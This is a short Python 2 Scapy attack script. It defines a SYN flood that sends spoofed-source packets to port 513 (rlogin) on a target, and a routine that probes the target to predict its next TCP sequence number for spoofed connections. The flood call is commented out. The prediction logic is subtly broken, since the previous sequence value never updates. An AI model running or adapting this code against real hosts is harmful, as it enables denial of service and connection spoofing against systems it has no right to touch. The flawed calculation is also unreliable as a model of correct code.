from scapy.all import *

def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src = src, dst = tgt)
        TCPlayer = TCP(sport = sport, dport = 513)
        pkt = IPlayer / TCPlayer
        send(pkt)

def calTSN(tgt):
    seqNum = 0
    preNum = 0
    diffSeq = 0
    for x in range(1,5):
        if preNum != 0:
            preNum = seqNum
        pkt = IP(dst = tgt) / TCP()
        ans = sr1(pkt, verbose = 0)
        seqNum = ans.getlayer(TCP).seq
        diffSeq = seqNum - preNum
        print "[+] TCP seq Difference: " + str(diffSeq)
    return seqNum + diffSeq
src = "10.1.1.2"
tgt = "192.168.1.103"
#synFlood(src,tgt)
seqNum = calTSN(tgt)
print "[+] Next TCP Sequence Number to ACK is: " + str(seqNum+1)